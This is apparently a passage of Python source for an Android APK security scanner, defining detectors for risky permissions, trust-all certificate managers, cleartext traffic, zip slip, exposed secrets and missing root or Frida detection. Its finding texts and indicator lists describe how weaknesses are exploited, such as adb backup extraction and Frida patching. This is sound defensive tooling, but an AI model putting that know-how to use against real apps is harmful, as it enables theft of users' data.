            "CWE-359"),
        "android.permission.READ_CALL_LOG": (
            "read-call-log", "READ_CALL_LOG permission", "medium",
            "Privacy-sensitive. Restricted by Play policies.",
            "Document need in privacy policy.", "CWE-359"),
        "android.permission.PROCESS_OUTGOING_CALLS": (
            "process-outgoing-calls", "PROCESS_OUTGOING_CALLS permission", "medium",
            "Allows blocking/redirecting outgoing calls.",
            "Restricted by Play policies; need a valid use case.", "CWE-359"),
        "android.permission.MOUNT_UNMOUNT_FILESYSTEMS": (
            "mount-fs", "MOUNT_UNMOUNT_FILESYSTEMS permission", "high",
            "Privileged; not granted to regular apps.",
            "Should not be present in normal apps.", "CWE-269"),
        "android.permission.WRITE_SETTINGS": (
            "write-settings", "WRITE_SETTINGS permission", "medium",
            "Modify global system settings.",
            "Use Settings.System APIs only; restricted on Android 6+.", "CWE-269"),
        "android.permission.PACKAGE_USAGE_STATS": (
            "usage-stats", "PACKAGE_USAGE_STATS permission", "medium",
            "Read app usage history — privacy-sensitive.",
            "Document need; user must enable in special settings.", "CWE-359"),
        "android.permission.READ_LOGS": (
            "read-logs", "READ_LOGS permission", "medium",
            "Privileged; not granted to user apps. If declared, app likely targets old Android.",
            "Should not be needed.", "CWE-532"),
        "android.permission.QUERY_ALL_PACKAGES": (
            "query-all", "QUERY_ALL_PACKAGES permission", "low",
            "Bypasses Android 11+ package visibility privacy. Restricted by Play policy.",
            "Use <queries> manifest entries with specific intent filters instead.", "CWE-359"),
        "android.permission.REQUEST_INSTALL_PACKAGES": (
            "install-packages", "REQUEST_INSTALL_PACKAGES permission", "medium",
            "App can install other APKs — potential dropper behaviour.",
            "Avoid unless you're an app store. Restricted by Play.", "CWE-269"),
        "android.permission.MANAGE_EXTERNAL_STORAGE": (
            "manage-external", "MANAGE_EXTERNAL_STORAGE permission", "medium",
            "All-files access on Android 11+. Privacy-sensitive.",
            "Use scoped storage / SAF instead. Heavily restricted by Play.", "CWE-922"),
    }
    for perm in perms:
        info = dangerous.get(perm)
        if not info: continue
        fid, title, sev, desc, rec, cwe = info
        f.append(Finding(
            id=fid, title=title, severity=sev, category="MASVS-PLATFORM",
            description=desc, evidence=f"<uses-permission android:name=\"{perm}\">",
            recommendation=rec, cwe=cwe, masvs="MSTG-PLATFORM-1",
            confidence="confirmed", source="mobsf",
        ))

    accessibility = False
    try:
        for elem in (apk.find_tags("service") or []):
            try:
                p = apk.get_value_from_tag(elem, "permission") or ""
                if "BIND_ACCESSIBILITY_SERVICE" in p:
                    accessibility = True; break
            except Exception:
                continue
    except Exception:
        pass
    if accessibility:
        f.append(Finding(
            id="accessibility-service",
            title="App declares an AccessibilityService",
            severity="medium", category="MASVS-PLATFORM",
            description=("AccessibilityService is highly privileged — reads all on-screen content "
                         "(passwords, OTPs) and injects events. Many malware families abuse this."),
            evidence='<service android:permission="...BIND_ACCESSIBILITY_SERVICE">',
            recommendation="Only use if your app's core function genuinely requires it.",
            cwe="CWE-269", masvs="MSTG-PLATFORM-1",
            confidence="confirmed", source="mastg",
        ))
    return f


# =============================================================================
# Biometric Misuse
# =============================================================================
def analyze_biometric_misuse(ctx: Ctx) -> list:
    f = []
    has_bio = _has_any_string(ctx, "BiometricPrompt", "FingerprintManager")
    has_bind = _has_any_string(ctx, "setUserAuthenticationRequired")
    if has_bio and not has_bind:
        f.append(Finding(
            id="biometric-no-key-binding",
            title="Biometric prompt without keystore key binding",
            severity="medium", category="MASVS-AUTH",
            description=("BiometricPrompt/FingerprintManager used without binding a Keystore key "
                         "via setUserAuthenticationRequired. Biometric becomes a UI gate that "
                         "Frida can patch."),
            evidence="Biometric API present, setUserAuthenticationRequired absent",
            recommendation=("Generate Keystore key with setUserAuthenticationRequired(true) and "
                            "perform a cryptographic operation in onAuthenticationSucceeded."),
            cwe="CWE-287", masvs="MSTG-AUTH-9",
            confidence="likely", source="mastg",
        ))
    return f


# =============================================================================
# FLAG_SECURE Missing
# =============================================================================
def analyze_flag_secure(ctx: Ctx) -> list:
    f = []
    if not _has_any_string(ctx, "FLAG_SECURE"):
        f.append(Finding(
            id="no-flag-secure",
            title="FLAG_SECURE never used",
            severity="low", category="MASVS-STORAGE",
            description=("No reference to WindowManager.LayoutParams.FLAG_SECURE in any DEX. "
                         "Sensitive screens can be screenshotted, recorded, and appear in OS "
                         "recents thumbnail."),
            evidence="No FLAG_SECURE in DEX strings",
            recommendation="Set FLAG_SECURE on Activities that display credentials, payment data, or PII.",
            cwe="CWE-200", masvs="MSTG-STORAGE-9",
            confidence="confirmed", source="mastg",
        ))
    return f


# =============================================================================
# Obfuscation Heuristic
# =============================================================================
def analyze_obfuscation(ctx: Ctx) -> list:
    f = []
    short = total = 0
    for dex in ctx.dex_list:
        try:
            for cls in dex.get_classes():
                name = (cls.get_name() or "").lstrip("L").rstrip(";")
                pure = name.split("/")[-1]
                if not pure or pure.startswith("$"): continue
                total += 1
                if len(pure) <= 2 and pure.isalpha():
                    short += 1
        except Exception:
            continue
    if total > 100:
        ratio = short / total
        if ratio < 0.05:
            f.append(Finding(
                id="not-obfuscated",
                title=f"App appears not obfuscated ({short}/{total} short class names)",
                severity="info", category="MASVS-RESILIENCE",
                description=(f"{total} classes scanned; only {short} ({ratio*100:.1f}%) "
                             "have short names. Production apps typically run R8/ProGuard."),
                evidence=f"{short}/{total}",
                recommendation="Enable R8 in release builds (minifyEnabled true).",
                masvs="MSTG-RESILIENCE-9",
                confidence="confirmed", source="mastg",
            ))
    return f


# =============================================================================
# Hostname Verifier
# =============================================================================
def analyze_hostname_verifier(ctx: Ctx) -> list:
    f = []
    if _has_any_string(ctx, "ALLOW_ALL_HOSTNAME_VERIFIER", "AllowAllHostnameVerifier"):
        f.append(Finding(
            id="hostname-verifier-allow-all",
            title="ALLOW_ALL_HOSTNAME_VERIFIER referenced",
            severity="critical", category="MASVS-NETWORK",
            description="App uses Apache's ALLOW_ALL_HOSTNAME_VERIFIER — full MITM exposure.",
            evidence="ALLOW_ALL_HOSTNAME_VERIFIER in DEX strings",
            recommendation="Use BROWSER_COMPATIBLE_HOSTNAME_VERIFIER or default verification.",
            cwe="CWE-297", masvs="MSTG-NETWORK-3",
            confidence="confirmed", source="mobsf",
        ))
    elif _has_method(ctx, "setHostnameVerifier"):
        f.append(Finding(
            id="custom-hostname-verifier",
            title="Custom HostnameVerifier present — review for trust-all logic",
            severity="medium", category="MASVS-NETWORK",
            description="Custom HostnameVerifier — many vulnerable apps return true unconditionally.",
            evidence="setHostnameVerifier present",
            recommendation="Review every custom verify() to ensure it actually validates the hostname.",
            cwe="CWE-297", masvs="MSTG-NETWORK-3",
            confidence="possible", source="mobsf",
        ))
    return f


# =============================================================================
# Java Deserialization
# =============================================================================
def analyze_deserialization(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, ["Ljava/io/ObjectInputStream;->readObject"])
    locs = []
    for v in found.values(): locs.extend(v)
    if locs:
        f.append(Finding(
            id="java-deserialization",
            title=f"Java ObjectInputStream.readObject at {len(locs)} site(s)",
            severity="high", category="MASVS-CODE",
            description=("Java native deserialization. If the byte stream is attacker-controlled "
                         "and the classpath has vulnerable gadgets, RCE is possible."),
            evidence="\n".join(locs[:6]),
            recommendation="Replace with safe formats (JSON, Protobuf). Validate class allow-list.",
            cwe="CWE-502", masvs="MSTG-CODE-8",
            confidence="likely", source="mhl",
        ))
    return f


# =============================================================================
# Zip Slip
# =============================================================================
def analyze_zip_slip(ctx: Ctx) -> list:
    f = []
    has_unzip = _has_method(ctx, "Ljava/util/zip/ZipInputStream;->getNextEntry",
                             "Ljava/util/zip/ZipFile;->entries")
    has_canonical = _has_any_string(ctx, "getCanonicalPath")
    if has_unzip and not has_canonical:
        f.append(Finding(
            id="zip-slip",
            title="Zip extraction without canonical path validation",
            severity="medium", category="MASVS-CODE",
            description=("App extracts ZIP archives but no getCanonicalPath check is visible. "
                         "Zip Slip vulnerability: archives with '../' entries can write files "
                         "outside target directory."),
            evidence="ZipInputStream usage; no canonical path check",
            recommendation=("Before writing each entry, resolve to canonical path and verify it "
                            "begins with the intended target directory."),
            cwe="CWE-22", masvs="MSTG-CODE-8",
            confidence="possible", source="mhl",
        ))
    return f


# =============================================================================
# Unprotected Broadcast Receivers (OVAA)
# =============================================================================
def analyze_unprotected_broadcasts(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    risky = []
    try:
        for elem in (apk.find_tags("receiver") or []):
            try:
                exp = apk.get_value_from_tag(elem, "exported")
                perm = apk.get_value_from_tag(elem, "permission") or ""
                name = apk.get_value_from_tag(elem, "name") or "?"
                has_filter = bool(elem.findall("intent-filter") if hasattr(elem, "findall") else [])
                if (exp == "true" or has_filter) and not perm:
                    risky.append(name)
            except Exception:
                continue
    except Exception:
        pass
    if risky:
        f.append(Finding(
            id="unprotected-broadcast-receivers",
            title=f"{len(risky)} broadcast receiver(s) without permission guard",
            severity="medium", category="MASVS-PLATFORM",
            description=("Receivers exported (or implicitly via intent-filter) without "
                         "android:permission are reachable from any app — OVAA's "
                         "UNPROTECTED_CREDENTIALS_DATA scenario."),
            evidence="\n".join(risky[:8]),
            recommendation='Set android:permission= or android:exported="false".',
            cwe="CWE-925", masvs="MSTG-PLATFORM-4",
            confidence="confirmed", source="oversecured",
        ))
    return f


# =============================================================================
# Implicit Broadcasts
# =============================================================================
def analyze_implicit_intents(ctx: Ctx) -> list:
    f = []
    has_b = _has_method(ctx, "Landroid/content/Context;->sendBroadcast",
                         "Landroid/content/Context;->sendStickyBroadcast")
    has_p = _has_any_string(ctx, "setPackage")
    if has_b and not has_p:
        f.append(Finding(
            id="implicit-broadcasts",
            title="sendBroadcast usage without setPackage",
            severity="low", category="MASVS-PLATFORM",
            description=("App sends broadcasts but no setPackage usage detected. Implicit "
                         "broadcasts can be captured by any matching receiver."),
            evidence="sendBroadcast present; no setPackage",
            recommendation="Use explicit broadcasts (Intent.setPackage) or LocalBroadcastManager.",
            cwe="CWE-925", masvs="MSTG-PLATFORM-4",
            confidence="possible", source="mastg",
        ))
    return f


# =============================================================================
# Cleartext Traffic Permitted
# =============================================================================
def analyze_cleartext_traffic(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        for elem in (apk.find_tags("application") or []):
            try:
                ct = apk.get_value_from_tag(elem, "usesCleartextTraffic")
                if ct == "true":
                    f.append(Finding(
                        id="usesCleartextTraffic-true",
                        title="usesCleartextTraffic=true at application level",
                        severity="high", category="MASVS-NETWORK",
                        description="App permits HTTP for ALL hosts. MITM-friendly default.",
                        evidence='android:usesCleartextTraffic="true"',
                        recommendation="Remove the attribute or set to false. Use Network Security Config domain exceptions if specific hosts truly need HTTP.",
                        cwe="CWE-319", masvs="MSTG-NETWORK-1",
                        confidence="confirmed", source="mobsf",
                    ))
            except Exception:
                continue
    except Exception:
        pass
    return f


# =============================================================================
# allowBackup
# =============================================================================
def analyze_allow_backup_explicit(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        for elem in (apk.find_tags("application") or []):
            try:
                ab = apk.get_value_from_tag(elem, "allowBackup")
                if ab == "true":
                    f.append(Finding(
                        id="allow-backup-true",
                        title="android:allowBackup=true",
                        severity="medium", category="MASVS-STORAGE",
                        description=("adb backup -f file -noapk <pkg> can extract app data without "
                                     "root. Files include shared_prefs, sqlite DBs, cached files."),
                        evidence='android:allowBackup="true"',
                        recommendation='Set android:allowBackup="false" or use android:fullBackupContent to scope.',
                        cwe="CWE-922", masvs="MSTG-STORAGE-8",
                        confidence="confirmed", source="mobsf",
                    ))
            except Exception:
                continue
    except Exception:
        pass
    return f


# =============================================================================
# debuggable
# =============================================================================
def analyze_debuggable_explicit(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    try:
        for elem in (apk.find_tags("application") or []):
            try:
                d = apk.get_value_from_tag(elem, "debuggable")
                if d == "true":
                    f.append(Finding(
                        id="app-debuggable-explicit",
                        title="android:debuggable=true (production app)",
                        severity="critical", category="MASVS-RESILIENCE",
                        description=("Debuggable apps can be attached to with jdb without root. "
                                     "run-as <pkg> works on any device."),
                        evidence='android:debuggable="true"',
                        recommendation='Remove the attribute. Debuggable should never ship in release.',
                        cwe="CWE-489", masvs="MSTG-RESILIENCE-2",
                        confidence="confirmed", source="mobsf",
                    ))
            except Exception:
                continue
    except Exception:
        pass
    return f


# =============================================================================
# Weak Random in security context
# =============================================================================
def analyze_weak_random(ctx: Ctx) -> list:
    f = []
    # If java.util.Random is used AND any crypto/key class is present
    has_random = _has_method(ctx, "Ljava/util/Random;-><init>", "Ljava/lang/Math;->random")
    has_crypto = _has_any_string(ctx, "javax/crypto/", "javax/crypto/spec/SecretKeySpec",
                                  "java/security/KeyPairGenerator")
    if has_random and has_crypto:
        f.append(Finding(
            id="weak-random-in-crypto",
            title="java.util.Random in crypto context",
            severity="high", category="MASVS-CRYPTO",
            description=("java.util.Random is statistically predictable — must not be used to "
                         "generate keys/IVs/nonces. Crypto APIs are also present."),
            evidence="Random.<init> + javax.crypto present",
            recommendation="Use java.security.SecureRandom for any security-sensitive randomness.",
            cwe="CWE-330", masvs="MSTG-CRYPTO-6",
            confidence="likely", source="mobsf",
        ))
    return f


# =============================================================================
# TrustManager that accepts all
# =============================================================================
def analyze_trust_all_certs(ctx: Ctx) -> list:
    f = []
    locs = []
    for dex in ctx.dex_list:
        try:
            for method in dex.get_methods():
                try:
                    nm = method.get_name() or ""
                    if nm not in ("checkServerTrusted", "checkClientTrusted"):
                        continue
                    code = method.get_code()
                    if code is None: continue
                    has_throw = False
                    has_any_check = False
                    for ins in code.get_bc().get_instructions():
                        op = ins.get_output() or ""
                        if "throw" in (ins.get_name() or ""):
                            has_throw = True
                        if "CertificateException" in op or "verify" in op or "checkValid" in op:
                            has_any_check = True
                    if not has_throw and not has_any_check:
                        # Stub method that does nothing -> trust-all
                        locs.append(f"{method.get_class_name()}->{nm}")
                except Exception:
                    continue
        except Exception:
            continue
    if locs:
        f.append(Finding(
            id="trustmanager-trust-all",
            title=f"TrustManager accepts all certificates ({len(locs)} method(s))",
            severity="critical", category="MASVS-NETWORK",
            description=("X509TrustManager.checkServerTrusted/checkClientTrusted is implemented "
                         "but throws nothing and performs no validation = full MITM exposure."),
            evidence="\n".join(locs[:6]),
            recommendation=("Use the system default TrustManager. If pinning is needed, validate "
                            "the certificate chain explicitly and throw on failure."),
            cwe="CWE-295", masvs="MSTG-NETWORK-3",
            confidence="confirmed", source="mobsf",
        ))
    return f


# =============================================================================
# Network Security Config
# =============================================================================
def analyze_network_security_config(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    nsc_path = None
    try:
        for elem in (apk.find_tags("application") or []):
            try:
                nsc = apk.get_value_from_tag(elem, "networkSecurityConfig")
                if nsc:
                    nsc_path = nsc
                    break
            except Exception:
                continue
    except Exception:
        pass
    if not nsc_path: return f
    # Read the referenced XML
    try:
        for fn in apk.get_files():
            if fn.endswith(nsc_path.split("/")[-1] + ".xml"):
                try:
                    data = apk.get_file(fn).decode("utf-8", errors="ignore")
                    if "cleartextTrafficPermitted=\"true\"" in data:
                        f.append(Finding(
                            id="nsc-cleartext-permitted",
                            title="Network Security Config: cleartextTrafficPermitted=true",
                            severity="high", category="MASVS-NETWORK",
                            description="NSC explicitly permits HTTP for some/all domains.",
                            evidence=f"In {fn}",
                            recommendation="Remove the override. Use HTTPS everywhere.",
                            cwe="CWE-319", masvs="MSTG-NETWORK-1",
                            confidence="confirmed", source="mobsf",
                        ))
                    if "<trust-anchors>" in data and "<certificates src=\"user\"" in data:
                        f.append(Finding(
                            id="nsc-user-cas",
                            title="Network Security Config: user CAs trusted",
                            severity="high", category="MASVS-NETWORK",
                            description=("NSC trusts user-installed CAs. Burp's CA can MITM the "
                                         "app — useful for testers but a finding for production."),
                            evidence=f"In {fn}",
                            recommendation="Trust only system CAs in production.",
                            cwe="CWE-295", masvs="MSTG-NETWORK-4",
                            confidence="confirmed", source="mobsf",
                        ))
                    break
                except Exception:
                    continue
    except Exception:
        pass
    return f


# =============================================================================
# Backup Rules
# =============================================================================
def analyze_backup_rules(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    risky_files = []
    try:
        for fn in apk.get_files():
            base = fn.split("/")[-1].lower()
            if base in ("backup_rules.xml", "backup_descriptor.xml", "auto_backup_rules.xml"):
                try:
                    data = apk.get_file(fn).decode("utf-8", errors="ignore")
                    if "<include" in data and ("path=\".\"" in data or "path=\"\"" in data):
                        risky_files.append(f"{fn}: broad <include path=\"\">")
                except Exception:
                    continue
    except Exception:
        pass
    if risky_files:
        f.append(Finding(
            id="backup-rules-broad",
            title="Auto Backup rules include broad paths",
            severity="medium", category="MASVS-STORAGE",
            description="Backup rules include broad / root paths — sensitive data may be backed up to user's Google Drive.",
            evidence="\n".join(risky_files),
            recommendation="Use <exclude> for sensitive directories (shared_prefs, databases).",
            cwe="CWE-922", masvs="MSTG-STORAGE-8",
            confidence="confirmed", source="mobsf",
        ))
    return f


# =============================================================================
# Hardcoded URLs / IPs
# =============================================================================
def analyze_hardcoded_urls(ctx: Ctx) -> list:
    f = []
    urls = set()
    ips = set()
    url_re = re.compile(r"\bhttps?://[A-Za-z0-9._\-/]{3,}")
    ip_re = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b")
    skip = ("schemas.android.com", "www.w3.org", "play.google.com",
            "schemas.openxmlformats.org", "ns.adobe.com")
    for s in _all_dex_strings(ctx, 100000):
        for m in url_re.findall(s):
            if not any(d in m for d in skip):
                urls.add(m)
        for m in ip_re.findall(s):
            # Skip 0.0.0.0, 127.0.0.1, 255.255.255.255, 192.168.* (private), version-like
            ip = m.split(":")[0]
            parts = ip.split(".")
            if all(0 <= int(p) <= 255 for p in parts):
                if ip in ("0.0.0.0", "127.0.0.1", "255.255.255.255"): continue
                if parts[0] in ("0", "127", "255"): continue
                if parts[0] == "10" or (parts[0] == "192" and parts[1] == "168"): continue
                if parts[0] == "172" and 16 <= int(parts[1]) <= 31: continue
                ips.add(m)
    if urls:
        f.append(Finding(
            id="hardcoded-urls",
            title=f"{len(urls)} hardcoded URL(s) in binary",
            severity="info", category="MASVS-CODE",
            description="Endpoint enumeration — useful for mapping the API surface.",
            evidence="\n".join(sorted(urls)[:30]),
            recommendation="Reconnaissance value only — no immediate action unless URLs leak internal infrastructure.",
            masvs="MSTG-CODE-2",
            confidence="confirmed", source="mobsf",
        ))
    if ips:
        f.append(Finding(
            id="hardcoded-ips",
            title=f"{len(ips)} hardcoded IP address(es)",
            severity="low", category="MASVS-CODE",
            description="Public IP literals in code may leak internal infrastructure or stale endpoints.",
            evidence="\n".join(sorted(ips)[:20]),
            recommendation="Replace with hostnames or config files.",
            masvs="MSTG-CODE-2",
            confidence="confirmed", source="mobsf",
        ))
    return f


# =============================================================================
# Hidden Strings / Base64 blobs
# =============================================================================
def analyze_base64_blobs(ctx: Ctx) -> list:
    f = []
    blobs = []
    b64_re = re.compile(r"\b[A-Za-z0-9+/]{60,}={0,2}\b")
    for s in _all_dex_strings(ctx, 50000):
        for m in b64_re.findall(s):
            if len(m) >= 80:
                blobs.append(m)
    blobs = sorted(set(blobs))[:30]
    if len(blobs) >= 3:
        f.append(Finding(
            id="base64-blobs",
            title=f"{len(blobs)} large base64-encoded string(s) in binary",
            severity="info", category="MASVS-CODE",
            description=("Long base64 strings may be obfuscated secrets, encoded keys, or hidden "
                         "configuration. Inspect manually — many are benign (icons, certificates)."),
            evidence="\n".join(b[:80] + "..." for b in blobs[:10]),
            recommendation="Decode each blob and verify content.",
            masvs="MSTG-CODE-2",
            confidence="possible", source="mobsf",
        ))
    return f


# =============================================================================
# Firebase project from google-services.json
# =============================================================================
def analyze_firebase_config(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    fbprj = []
    try:
        for fn in apk.get_files():
            if fn.endswith("google-services.json") or fn.endswith("GoogleService-Info.plist"):
                fbprj.append(fn)
    except Exception:
        pass
    # Also check string resources
    for s in _all_dex_strings(ctx, 50000):
        m = re.search(r"https://([a-z0-9\-]+)\.firebaseio\.com", s)
        if m: fbprj.append(f"DB: {m.group(0)}")
    if fbprj:
        f.append(Finding(
            id="firebase-project-detected",
            title=f"Firebase project configuration detected ({len(set(fbprj))} reference(s))",
            severity="medium", category="MASVS-CODE",
            description=("App uses Firebase. Common misconfigurations: Realtime DB rules left open, "
                         "Firestore rules permitting any auth user, FCM key reuse, Storage bucket open."),
            evidence="\n".join(sorted(set(fbprj))[:10]),
            recommendation=("Audit Firebase rules at console.firebase.google.com — for each "
                            "Realtime DB / Firestore / Storage bucket, rules should require auth "
                            "AND scope reads to per-user paths."),
            cwe="CWE-732", masvs="MSTG-CODE-2",
            confidence="confirmed", source="mobsf",
        ))
    return f


# =============================================================================
# Tapjacking — filterTouchesWhenObscured missing
# =============================================================================
def analyze_tapjacking(ctx: Ctx) -> list:
    f = []
    if not _has_any_string(ctx, "setFilterTouchesWhenObscured", "filterTouchesWhenObscured"):
        try:
            min_sdk = int(ctx.apk.get_min_sdk_version() or 0)
        except Exception:
            min_sdk = 0
        if min_sdk < 23:
            f.append(Finding(
                id="tapjacking-vulnerable",
                title="No filterTouchesWhenObscured + minSdk<23",
                severity="medium", category="MASVS-PLATFORM",
                description=("App does not use setFilterTouchesWhenObscured and supports devices "
                             "before Android 6 (where overlay touches are not blocked by default). "
                             "Sensitive UI (Settings, payment, consent) can be tapjacked."),
                evidence=f"minSdk={min_sdk}; no filterTouchesWhenObscured strings",
                recommendation="Set android:filterTouchesWhenObscured=\"true\" on sensitive views.",
                cwe="CWE-1021", masvs="MSTG-PLATFORM-9",
                confidence="possible", source="mobsf",
            ))
    return f


# =============================================================================
# Emulator / Root Detection presence
# =============================================================================
def analyze_root_detection(ctx: Ctx) -> list:
    f = []
    indicators = ["RootBeer", "/system/bin/su", "/system/xbin/su", "test-keys",
                  "isRooted", "/system/app/Superuser.apk", "magisk"]
    found = sum(1 for i in indicators if _has_any_string(ctx, i))
    if found < 2:
        f.append(Finding(
            id="no-root-detection",
            title="Weak/no root-detection indicators",
            severity="info", category="MASVS-RESILIENCE",
            description=("Few common root-detection patterns found. For high-value apps consider "
                         "adding multiple checks (path + RootBeer + native + Play Integrity)."),
            evidence=f"{found}/{len(indicators)} indicators present",
            recommendation="Use Play Integrity API for server-side attestation.",
            masvs="MSTG-RESILIENCE-1",
            confidence="possible", source="mastg",
        ))
    return f


def analyze_emulator_detection(ctx: Ctx) -> list:
    f = []
    indicators = ["generic", "google_sdk", "Emulator", "ranchu", "vbox86p",
                  "goldfish", "Genymotion"]
    if not any(_has_any_string(ctx, i) for i in indicators):
        f.append(Finding(
            id="no-emulator-detection",
            title="No emulator detection indicators",
            severity="info", category="MASVS-RESILIENCE",
            description="No Build.* fingerprint checks found — emulators run unrestricted.",
            evidence="No emulator-detection patterns",
            recommendation="Optional defense in depth: Build.FINGERPRINT.contains('generic'), Build.MANUFACTURER, etc.",
            masvs="MSTG-RESILIENCE-5",
            confidence="possible", source="mastg",
        ))
    return f


# =============================================================================
# Frida / Xposed Detection
# =============================================================================
def analyze_anti_hooking(ctx: Ctx) -> list:
    f = []
    indicators = ["frida-server", "frida-gadget", "/data/local/tmp/re.frida.server",
                  "de.robv.android.xposed", "XposedBridge", "frida-agent"]
    if not any(_has_any_string(ctx, i) for i in indicators):
        f.append(Finding(
            id="no-anti-hooking",
            title="No Frida/Xposed detection",
            severity="info", category="MASVS-RESILIENCE",
            description="No hook-detection indicators — Frida/Xposed bypass is straightforward.",
            evidence="No frida/Xposed strings",
            recommendation="Defense in depth: ptrace anti-debug + Frida port scan + classloader inspection.",
            masvs="MSTG-RESILIENCE-4",
            confidence="possible", source="mastg",
        ))
    return f


# =============================================================================
# Debuggable native libs (shipped .so with debug symbols)
# =============================================================================
def analyze_native_lib_protections(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    libs = []
    try:
        for fn in apk.get_files():
            if fn.startswith("lib/") and fn.endswith(".so"):
                libs.append(fn)
    except Exception:
        return f
    if not libs: return f
    # Heuristic: read native libs and look for stack canaries / debug symbols
    weak = []
    for lib in libs[:8]:
        try:
            data = apk.get_file(lib)
            if not data: continue
            # __stack_chk_guard absent → no stack canary (best-effort)
            if b"__stack_chk_guard" not in data and b"__stack_chk_fail" not in data:
                weak.append(f"{lib}: no stack canary")
            # GNU debug section name
            if b".debug_info" in data:
                weak.append(f"{lib}: contains .debug_info")
        except Exception:
            continue
    if weak:
        f.append(Finding(
            id="native-libs-weak-protections",
            title=f"Native libraries missing protections ({len(weak)})",
            severity="medium", category="MASVS-CODE",
            description=("Shipped .so files lack stack canaries (-fstack-protector-strong) or "
                         "ship debug symbols. Easier to reverse and exploit."),
            evidence="\n".join(weak[:10]),
            recommendation="Build NDK libs with: -fstack-protector-strong -D_FORTIFY_SOURCE=2 -fPIE; strip symbols.",
            cwe="CWE-693", masvs="MSTG-CODE-9",
            confidence="likely", source="mobsf",
        ))
    return f


# =============================================================================
# Exposed Secrets in resources
# =============================================================================
def analyze_resource_secrets(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    matches = []
    try:
        for fn in apk.get_files():
            if not (fn.startswith("res/") or fn.endswith("strings.xml") or fn.endswith(".json")):
                continue
            try:
                data = apk.get_file(fn).decode("utf-8", errors="ignore")
                for pid, title, regex, sev, cwe in SECRET_PATTERNS:
                    for m in re.finditer(regex, data):
                        v = m.group(0)[:80]
                        matches.append(f"{fn}: {title} -> {v}")
                        if len(matches) > 50: break
            except Exception:
                continue
            if len(matches) > 50: break
    except Exception:
        pass
    if matches:
        f.append(Finding(
            id="resource-secrets",
            title=f"Secrets found in resources/strings ({len(matches)})",
            severity="critical", category="MASVS-CODE",
            description="Secrets in resource files (XML/JSON) are even easier to extract than DEX strings.",
            evidence="\n".join(matches[:15]),
            recommendation="Move to backend. Rotate. Never commit secrets to resources/.",
            cwe="CWE-798", masvs="MSTG-CODE-2",
            confidence="confirmed", source="mobsf",
        ))
    return f


# =============================================================================
# Insecure HTTP libraries (HTTP, OkHttp without HttpsURLConnection)
# =============================================================================
def analyze_http_clients(ctx: Ctx) -> list:
    f = []
    has_apache = _has_any_string(ctx, "org.apache.http.HttpHost",
                                  "org.apache.http.client.HttpClient")
    if has_apache:
        f.append(Finding(
            id="apache-http-legacy",
            title="Apache HTTP legacy client detected",
            severity="medium", category="MASVS-NETWORK",
            description=("Apache HTTP client is deprecated since Android 6 and removed in API 28. "
                         "Often ships without strict TLS defaults."),
            evidence="org.apache.http.* references in DEX",
            recommendation="Migrate to OkHttp/HttpURLConnection.",
            masvs="MSTG-NETWORK-3",
            confidence="confirmed", source="mobsf",
        ))
    return f


# =============================================================================
# Reflection usage (general indicator)
# =============================================================================
def analyze_reflection(ctx: Ctx) -> list:
    f = []
    found = _scan_dex_for(ctx, ["Ljava/lang/reflect/Method;->invoke",
                                "Ljava/lang/Class;->forName"])
    locs = []
    for v in found.values(): locs.extend(v)
    if len(locs) >= 5:
        f.append(Finding(
            id="reflection-usage",
            title=f"Reflection usage at {len(locs)} site(s)",
            severity="info", category="MASVS-CODE",
            description=("Reflection is often used by obfuscators or to invoke hidden APIs. Heavy "
                         "use can also indicate runtime class loading patterns worth investigating."),
            evidence=f"{len(locs)} call sites",
            recommendation="Reflection is fine for legitimate use; just an indicator for review.",
            masvs="MSTG-CODE-9",
            confidence="confirmed", source="mobsf",
        ))
    return f


# =============================================================================
# AccessibilityService for input capture (variant)
# =============================================================================
def analyze_keyboard_cache(ctx: Ctx) -> list:
    f = []
    if _has_any_string(ctx, "EditText"):
        if not _has_any_string(ctx, "InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS",
                                "TYPE_TEXT_VARIATION_PASSWORD",
                                "android:inputType=\"textNoSuggestions\""):
            f.append(Finding(
                id="keyboard-cache-risk",
                title="EditText fields without anti-cache hints",
                severity="info", category="MASVS-STORAGE",
                description=("EditText is used but no inputType=textNoSuggestions or password "
                             "variants are referenced. Sensitive fields like email/username may "
                             "be cached by the IME and stored on disk."),
                evidence="No anti-cache inputType hints in DEX strings",
                recommendation="Set android:inputType=\"textNoSuggestions\" or similar on sensitive fields.",
                cwe="CWE-524", masvs="MSTG-STORAGE-5",
                confidence="possible", source="mobsf",
            ))
    return f


# =============================================================================
# Native libraries — known-vulnerable libraries
# =============================================================================
def analyze_known_vuln_libs(ctx: Ctx) -> list:
    f = []
    apk = ctx.apk
    matches = []
    risky_libs = {
        "libwebp": "CVE-2023-4863 (Heap buffer overflow)",
        "libavcodec": "Multiple FFmpeg CVEs over years",
        "libopenssl": "Multiple OpenSSL CVEs — check version",
        "libssl": "Multiple OpenSSL CVEs — check version",
        "libcurl": "Check libcurl CVEs",
        "libsqlite": "Check SQLite version for known issues",
    }
    try:
        for fn in apk.get_files():
            if fn.startswith("lib/") and fn.endswith(".so"):
                base = fn.split("/")[-1]
                for lib, note in risky_libs.items():
                    if lib in base.lower():
                        matches.append(f"{fn}: {note}")
                        break
    except Exception:
        pass
    if matches:
        f.append(Finding(
            id="known-vuln-libs",
            title=f"Bundled libraries with known CVE history ({len(matches)})",
            severity="medium", category="MASVS-CODE",
            description=("App ships native libraries that have had significant CVEs. Verify the "
                         "version is current — old libraries are a frequent RCE vector."),
            evidence="\n".join(matches[:10]),
            recommendation="Update bundled native libs to current versions.",
            cwe="CWE-1104", masvs="MSTG-CODE-5",
            confidence="possible", source="mobsf",
        ))
    return f


# =============================================================================
# WebView setSavePassword (deprecated, dangerous)
# =============================================================================
def analyze_webview_save_password(ctx: Ctx) -> list:
    f = []
    if _has_method(ctx, "setSavePassword"):
        f.append(Finding(
            id="webview-savepassword",
            title="WebView setSavePassword usage",
            severity="medium", category="MASVS-STORAGE",
